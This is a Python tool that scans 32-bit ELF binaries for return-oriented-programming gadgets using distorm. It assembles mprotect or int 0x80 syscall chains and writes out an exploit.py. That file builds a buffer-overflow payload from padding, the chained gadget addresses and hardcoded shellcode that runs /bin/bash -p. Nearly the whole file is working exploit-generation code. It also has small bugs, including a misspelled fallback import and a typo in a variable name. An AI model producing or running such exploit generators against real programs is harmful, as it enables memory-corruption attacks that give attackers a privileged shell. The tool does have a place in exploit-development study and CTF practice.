#!/usr/bin/env python

from __future__ import print_function
import os
import sys
from  subprocess import *

try:
	import distorm
except (ImportError):
	import distrom3 as distrom

class ELF:

	READELF = "/usr/bin/readelf"
	
	def __init__(self, binfiles):
		self.__binfiles = binfiles
		self.__gadgets = []
		self.generate_gadgets()
	
	def generate_gadgets(self):
		for index, binfile in enumerate(self.__binfiles):
			code = open(binfile, 'rb').read()
			print("[*] Loading gadgets from %s" % binfile)
			disassembly = distorm.DecodeGenerator(0, code, distorm.Decode32Bits)
			last_few_inxs = []
			for (offset, size, inx, hexdump) in disassembly:
				last_few_inxs.append({
					"offset": offset,
					"inx": inx,
					"base_index": index,
				})
				inxx = "".join(inx.split())
				if inxx == "RET":
					self.__gadgets.append(last_few_inxs[-9:])
					last_few_inxs = []
				elif inxx == "JMPESP" or inxx == "CALLESP":
					self.__gadgets.append(last_few_inxs[-1:])
					lst_few_inxs = []

	def function_offset(self, func):
		for index, binfile in enumerate(self.__binfiles):
			out = self.__execute_cmd(self.READELF + " -s " + binfile)
			for line in out:
				if line.find(" " + func + "@@GLIBC") != -1:
					tok = line.split()
					offset = int(tok[1], 16)
					if offset != 0:
						return {"offset": offset, "base_index": index}

	def find_pop3ret(self):
		for gadget in self.__gadgets:
			popcount = 0
			for asm in gadget:
				if asm["inx"].find("POP") != -1:
					popcount += 1
				elif asm["inx"].find("RET") == -1:
					popcount = 0
			if popcount >= 3 :
				return gadget[-4:][0]

	def find_jmp_esp(self):
		for gadget in self.__gadgets:
			for asm in gadget:
				if asm["inx"].find("JMP ESP") != -1:
					return asm

	def find_call_esp(self):
		for gadget in self.__gadgets:
			for asm in gadget:
				if asm["inx"].find("CALL ESP") != -1:
					return asm

	def find_pop_ret(self, reg):
		for gadget in self.__gadgets:
			if ";".join([asm["inx"] for asm in gadget]).find("POP %s;RET" % reg) != -1:
				return gadget[-2]

	def find_int_0x80(self):
		for gadget in self.__gadgets:
			if ";".join([asm["inx"] for asm in gadget]).find("INT 0x80;RET") != -1:
				return gadget[-2]

	def find_call_gs_10(self):
		for gadget in self.__gadgets:
			inx_str = ";".join([asm["inx"] for asm in gadget])
			if inx_str.find("CALL GS:[0x10];RET") != -1 or inx_str.find("CALL DWORD [GS:0x10];RET") != -1:
				return gadget[-2]

	#def find_xor_eax_value(self):
	#	for gadget in self.__gadgets:
	#		count = 0
	#		for asm in gadget:
	#			if asm["inx"].find("XOR EAX, 0x") != -1:
	#				count += 1
	#			elif "".join(asm["inx"].split()) != "RET":
	#				count = 0
	#		if count >= 1:
	#			self.__print_gadget(gadget[-2:])
	#			return gadget[-2]

	def __get_a_good_reg(self, bad_regs):
		all_regs = ["EAX", "EBX", "ECX", "EDX", "EBP"]
		for reg in all_regs:
			if reg not in bad_regs:
				return reg

	def __print_gadget(self, gadget):
		print("0x%x\t" % gadget[0]["offset"], end="")
		for asm in gadget:
			print(asm["inx"] + "; ", end="")
		print("")

	def __execute_cmd(self, cmd):
		out = Popen(cmd, shell=True, stdout=PIPE).communicate()[0]
		return out.split("\n")

	def find_jmp_shellcode(self):
		jmp = self.find_call_esp()
		if jmp:
			print("[*] CALL ESP found")
			return jmp
		else:
			print("[-] CALL ESP not found")

		jmp = self.find_jmp_esp()
		if jmp:
			print("[*] JMP ESP found")
			return jmp
		else:
			print("[-] JMP ESP not found")

	def find_syscall_gadget(self):
		int_0x80 = self.find_int_0x80()
		if int_0x80:
			print("[*] INT 0x80 found")
			return int_0x80
		else:
			print("[-] INT 0x80 not found")

		int_0x80 = self.find_call_gs_10()
		if int_0x80:
			print("[*] CALL GS:[0x10] found")
			return int_0x80
		else:
			print("[-] CALL GS:[0x10] not found")

	def generate_syscall_chain(self):
		int_0x80 = self.find_syscall_gadget()
		if int_0x80 is None:
			return
		pop_eax = self.find_pop_ret("EAX")
		if pop_eax is None:
			print("[-] POP EAX not found")
			return
		else:
			print("[*] POP EAX found")
		pop_ebx = self.find_pop_ret("EBX")
		if pop_ebx is None:
			print("[-] POP EBX not found")
			return
		else:
			print("[*] POP EBX found")
		pop_ecx = self.find_pop_ret("ECX")
		if pop_ecx is None:
			print("[-] POP ECX not found")
			return
		else:
			print("[*] POP ECX found")
		pop_edx = self.find_pop_ret("EDX")
		if pop_edx is None:
			print("[-] POP EDX not found")
			return
		else:
			print("[*] POP EDX found")
		jmp = self.find_jmp_shellcode()
		if not jmp:
			print("[-] Can't jump to shellcode")
			jmp = {"offset": 0, "base_index": 0}
		gadgets = []
		gadgets.append({"name": "pop edx", "asm": pop_edx})
		gadgets.append({"name": "mprotect arg3", "value":  0x00000007})
		gadgets.append({"name": "pop ecx", "asm": pop_ecx})
		gadgets.append({"name": "mprotect arg2", "value": 0x00021000})
		gadgets.append({"name": "pop ebx", "asm": pop_ebx})
		gadgets.append({"name": "mprotect arg1", "value": 0xbffdf000})
		gadgets.append({"name": "pop eax", "asm": pop_eax})
		gadgets.append({"name": "mprotect syscall number", "value": 0x7d})
		gadgets.append({"name": "syscall gadget", "asm": int_0x80})
		gadgets.append({"name": "jmp to shellcode", "asm": jmp})
		return gadgets

				
	def generate_mprotect_chain(self):
		mprotect = self.function_offset("mprotect")
		if mprotect is None:
			print("[-] Can't find mprotect symbol")
			mprotect = {"offset": 0, "base_index": 0}
		else:
			print("[*] Found mprotect symbol")

		pop3ret = self.find_pop3ret()
		if pop3ret is None:
			print("[-] Can't find `pop3; ret;` gadget")
			pop3ret = {"offset": 0, "base_index": 0}
		else:
			print("[*] Found  pop3ret")

		
		jmp = self.find_jmp_shellcode()
		if not jmp:
			print("[-] Can't jump to shellcode")
			jmp = {"offset": 0, "base_index": 0}

		gadgets = []
		gadgets.append({"name": "mprotect", "asm": mprotect})
		gadgets.append({"name": "pop3ret", "asm": pop3ret})
		gadgets.append({"name": "mprotect arg1", "value": 0xbffdf000})
		gadgets.append({"name": "mprotect arg2", "value": 0x00021000})
		gadgets.append({"name": "mprotect arg3", "value":  0x00000007})
		gadgets.append({"name": "jmp to shellcode", "asm": jmp})
		return gadgets

	def generate_exploit_file(self, payload):
		exploit_py = "exploit.py"
		print("[*] Generating %s file" % exploit_py)
		with open(exploit_py, "w+") as f:
			lines = []
			lines.append("#!/usr/bin/env python")
			lines.append("# Auto generated by %s" % sys.argv[0])
			lines.append("")
			lines.append("import struct")
			lines.append("import subprocess")
			lines.append("")
			lines.append("pack = lambda x : struct.pack('<I', x)")
			lines.append("")
			for index, binfile in enumerate(self.__binfiles):
				lines.append("IMAGE_BASE_%d = 0x00000000 # %s" % (index, binfile))
				lines.append("rebase_%d = lambda x : pack(x + IMAGE_BASE_%d)" % (index, index))
				lines.append("")
			lines.append("buf = 'A' * 280")
			for gadget in payload:
				if "asm" in gadget:
					lines.append("buf += rebase_%d(0x%x)\t# %s" % (gadget["asm"]["base_index"], gadget["asm"]["offset"], gadget["name"]))
				elif "value" in gadget:
					lines.append("buf += pack(0x%x)\t\t# %s" % (gadget["value"], gadget["name"]))
			lines.append("\n# shellcode to launch shell")
			lines.append("buf += '\\x90\\x90\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70'")
			lines.append("buf += '\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61'")
			lines.append("buf += '\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52'")
			lines.append("buf += '\\x51\\x53\\x89\\xe1\\xcd\\x80'")
			lines.append("")
			lines.append("with open('payload.out', 'w+') as f:")
			lines.append("\tf.write(buf)")
			lines.append("\tf.close()")
			f.writelines("\n".join(lines))

	def generate_rop_chain(self):
		payload = None
		payload = self.generate_syscall_chain()
		if payload is None:
			payload = self.generate_mprotect_chain()
		self.generate_exploit_file(payload)
		#print(str(payload))

def print_help(msg=None):
	if msg:
		print(msg)
	print("Usage: %s <binary_file1> <binary_file2> ..." % sys.argv[0])
	sys.exit(-1)

if __name__ == "__main__":
	if len(sys.argv) < 2:
		print_help()
	for filename in sys.argv[1:]:
		if not os.path.isfile(filename):
			print_help("ERROR: invalid file: %s." % filename)
	elf = ELF(sys.argv[1:])
	elf.generate_rop_chain()
	#print(elf.find_xor_eax_value())

